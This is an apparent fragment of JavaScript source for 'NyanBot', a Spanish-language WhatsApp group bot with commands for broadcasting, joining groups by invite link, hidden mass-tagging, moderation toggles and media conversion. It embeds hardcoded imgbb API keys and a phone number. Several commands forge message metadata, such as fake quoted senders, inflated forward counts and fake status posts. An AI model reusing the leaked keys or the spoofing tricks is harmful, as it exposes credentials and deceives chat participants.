const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
buff = await samu330.downloadMediaMessage(encmedia)
for (let _ of anu) {
samu330.sendMessage(_.jid, buff, image, {caption: `${body.slice(4)}\n\n ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°`})
						}
reply('Anuncio dado')
} else {
for (let _ of anu) {
sendMess(_.jid, `	°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°\n	[🪀 _NyanBot_]\n🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*\n\n${args.join(' ')}`)}
}
reply('Anuncio dado')

break
case 'stats':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
texxt = await msg.stats(totalChat1)
await wa.sendFakeStatus(from, texxt, "BOT STATS")
break
case 'bloquear':
samu330.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !itsMe) return reply(mess.only.ownerB)
samu330.blockUser (`${body.slice(8)}@c.us`, "add")
samu330.sendMessage(from, `Usuario bloqueado`, MessageType.text, {
quoted: fliveLoc
  })
  break
case 'desbloquear':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (isGroup) {
if (mentionUser.length == 0) return await reply("Tag targer!")
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
await samu330.blockUser (mentioned, "remove")
}
break
case 'salir':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isGroup) return await reply(mess.only.group)
reply(`Saldre de este grupo: ${groupName} en 3 segundos`).then(async() => {
await help.sleep(3000)
await samu330.groupLeave(from)
})
break
case 'entrabot':
linkgp = args.join(' ')
if (!linkgp) return reply('Y el link del grupo... onta!?')
samunum = '5219984907794@swahtsapp.net'		
var eb = q.split('https://chat.whatsapp.com/')[1]
var { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await samu330.query({ 
json: ["query", "invite", eb],
expect200:true })

samu330.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Ya entre al grupo😉')
samu330.sendMessage(id, `*Hola* 🙋🏻‍♂️\nSoy Samu _(NyanBot)_ [ @${samunum.split('@')[0]} ],\n@${sender.split('@')[0]} me ha asignado como *BOT* para este grupo *(@${subject.split('@')[0]})*\n\n*Informacion de este grupo:*\n\👑Creador: @${owner.split('@')[0]}\n📚 Fecha de creacion: ${Date(creation * 1000)}\n\nTotal de participantes: ${participants}*\nQuien escribio la descripcion? ${descOwner}\n✏ Descripcion:\n${desc}\n\n*Porfavor sige mis reglas, para leer mis reglas escribe:*\n${prefix}reglas\nPorfavor sigelas o atente a las consecuencias⚠\n*Quedo a su dispocicion, no me agan sentir mal.... por que yo tambien tengo corazon😣*`, MessageType.text, {quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
}, message: {"documentMessage": { "title": `${subject}`, 'jpegThumbnail': fs.readFileSync('./src/ara.png')}}}})
break
case 'clearall':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
for (let chat of totalChat) {
await samu330.modifyChat(chat.jid, "delete")
}
await wa.sendFakeStatus(from, "Success clear all chat", "success")
break

case 'hidetag':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
await wa.hideTag(from, args.join(" "))
break
case 'imagetag':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
if (!isQuotedImage && !isImage) return await reply(`Lalala... *cancion feliz*\nY la imagen pedazo de nada? >:/`)
mediatag = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(mediatag)
await wa.hideTagImage(from, buffer)
break
case 'toimg':
case 'aimg':
if (!isQuotedSticker) return reply(`send sticker and reply with caption ${prefix}toimg`)
if (sam.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
reply(`Este comando solo sirve con stikers estaticos, para convertir un stiker a gif, usa: ${prefix}agif`)
} else {
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
ran = getRandom('.png')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) {
reply(`error\n\n${err}`)
fs.unlinkSync(ran)
} else {
buffer = fs.readFileSync(ran)
samu330.sendMessage(from, buffer, MessageType.image, {quoted: sam, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
fs.unlinkSync(ran)
}
})
}
break
case 'agif':
ger = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
var imgbb = require('imgbb-uploader')
reply('*Espera un momento...*')
owgi = await samu330.downloadAndSaveMediaMessage(ger)
data = await imgbb("b0fc132474ca03ee7898fd5cac7275fe", owgi)
anu = await getJson(`https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${api}&img=${data.display_url}`)
result = await getBuffer(anu.result)
samu330.sendMessage(from, result, video, {quoted: ftoko, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒', mimetype: 'video/gif'})

break
case 'toptt':
reply(`wait..`)
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
var ran = getRandom('.mp3')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) return reply('error')
topt = fs.readFileSync(ran)
samu330.sendMessage(from, topt, MessageType.audio, {mimetype: 'audio/mp4', quoted: faud, ptt:true})
})
break
case 'stickertag':
		
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply('This command only for admin')
if (!isQuotedImage && !isImage) return await reply('Etiqueta un stiker')
media = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(media)
await wa.hideTagSticker(from, buffer)
break
case 'promote':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply('Botcito debe ser admin')
if (mentionUser.length == 0) return await reply('Tag member')
await wa.promoteAdmin(from, mentionUser)
await reply(`Tenemos nuevo Admin`)
break
case 'demote':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (mentionUser.length == 0) return await reply('Tag member!')
await wa.demoteAdmin(from, mentionUser)
await reply(`jsjs un adm menos`)
break
case 'admin':
addFilter(from)
var textt = msg.admin(groupAdmins, groupName)
await wa.sendFakeStatus(from, textt, "LIST ADMIN", groupAdmins)
break
case 'link':
addFilter(from)
var link = await wa.getGroupInvitationCode(from)
await wa.sendFakeStatus(from, link, "El lik de este grupo es")
break
case 'grupo':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (args[0] === 'abrir') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, false).then(() => {
wa.sendFakeStatus(from, "*Success open group*", "GROUP SETTING")
})
} else if (args[0] === 'cerrar') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
wa.sendFakeStatus(from, "*Succes close group*", "GROUP SETTING")
})
} else {
await reply(`Example: ${prefix}${command} open/close`)
}
break

case 'ttp':
addFilter(from)
if (args.length < 1) return reply('Y el texto?')
var teks = encodeURIComponent(args.join(' '))
const ttp = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${teks}`)
samu330.sendMessage(from, ttp, sticker, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'añadir':
addFilter(from)
if (!isGroup) return reply(mess.only.group)
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Y el numero?')
if (args[0].startsWith('99')) return reply('Utiliza el codigo de pais')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
samu330.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
return samu330.sendMessage(from, 'Modo privado dice:v', MessageType.text)
}
break

case 'antileg':
if (!isGroup) return reply('Este comando es solo para grupos')
if (args.length < 1) return reply('escriba *1* para activar')
if (args[0] === '1') {
if (isAntiLeg) return reply('Ya esta activo')
legion.push(from)
fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
reply('*Modo antilegiones activado✅*')
} else if ((args[0]) === '0') {
var ini = legion.indexOf(from)
legion.splice(ini, 1)
fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
reply('Antilegiones desactivado✔️')
} else {
reply('*1 para activar, 0 para desactivar*')
}
break
case 'nombre':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
var newName = args.join(" ")
samu330.groupUpdateSubject(from, newName).then(() => {
wa.sendFakeStatus(from, "El nombre del grupo se ah cambiao a" + newName, "GROUP SETTING")
})
break
case 'setdesc':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
var newDesc = args.join(" ")
samu330.groupUpdateDescription(from, newDesc).then(() => {
wa.sendFakeStatus(from, "La descripcion del grupo se ah cambiado a" + newDesc, "GROUP SETTING")
})
break
case 'wasted':
addFilter(from)
var imgbb = require('imgbb-uploader')
if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
reply(mess.wait);
owgi = await samu330.downloadAndSaveMediaMessage(ger);
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi);
teks = `${anu.display_url}`;
anu1 = await getBuffer(`https://some-random-api.ml/canvas/wasted?avatar=${teks}`);
fs.writeFileSync('wasted.jpg', anu1)
samu330.sendMessage(from, fs.readFileSync('wasted.jpg'), MessageType.image)
} else {
reply('Manda la foto!');
}			
break
case 'caras':
var imgbb = require('imgbb-uploader')
if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
cara = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
reply(mess.wait);
samsam = await samu330.downloadAndSaveMediaMessage(cara);
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', samsam);
resultc = `${anu.display_url}`;
caras = await getBuffer(`https://api.lolhuman.xyz/api/facedetect?apikey=${api}&img=${resultc}`)
fs.writeFileSync('caras.jpg', caras)
samu330.sendMessage(from, fs.readFileSync('caras.jpg'), MessageType.image, {quoted: fimg, caption: '💠Samu330 | NyanBot💎'})
} else {
reply('*Porfavor etiqueta una imagen con el comando*')
}
break
		
case 'ger':
addFilter(from)
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
var imgbb = require('imgbb-uploader')
if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
reply('*Espera un momento porfavor*')
owgi = await samu330.downloadAndSaveMediaMessage(ger)
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('*Uuuu, algo salio mal, intenta de nuevo*')
nobg = fs.readFileSync(rano)
samu330.sendMessage(from, nobg, sticker, {quoted: ftoko})
fs.unlinkSync(rano)
})
                                    
} else {
reply('Se nececita una foto!')
}
				
 break
	case 'antimedia':                
if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)     
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isAntiMedia) return reply('*Ya está activo*')          
	antimedia.push(from)                          
	fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))      
	reply(`*[ Activado ]*`)  
	reply(`*La persona que envie fotos o videos sera eliminada*`)  
} else if (args[0] === '0') {             
	var ini = antimedia.indexOf(from)
	antimedia.splice(ini, 1)           
	fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break

case 'antifake':                
if (!isWelkom) return reply('*Este comando solo se puede usar cuando la bienvenida esta activada*')
if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)     
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isAntiFake) return reply('*Ya está activo*')          
	antifake.push(from)                          
	fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))      
	reply(`*[ Activado ]*`)  
	reply(`*Los numeros considerados como FAKEs, sera eliminados del grupo*`)  
} else if (args[0] === '0') {             
	var ini = antifake.indexOf(from)
	antifake.splice(ini, 1)           
	fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break
case 'banchat':
if (!itsMe) return reply('🤔')
if (args.length < 1) return reply('*Amm... para activar usa *1* y para desactivar *0*')
if (body.endsWith('1')) {
if (isBanChat) return reply('Este chat ya ah estado baneado!')
chatban.push(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
reply('*♻Este chat a sido baneado*')
} else if (body.endsWith('0')) {
chatban.splice(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
reply('*♻Este chat a dejado de ser baneado*')
} else {
reply(`Porfavor escriba bien el comando: ${prefix}banchat *0/1*`)
}
break
case 'ban':
if (!itsMe) return reply(mess.only.ownerB)
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
addBanned(mentioned[0], args[1], ban)
}
mentions(`@${mentioned[0].split('@')[0]} Usted a sido baneado, lo que significa que no podra usar el bot!`, mentioned, true)
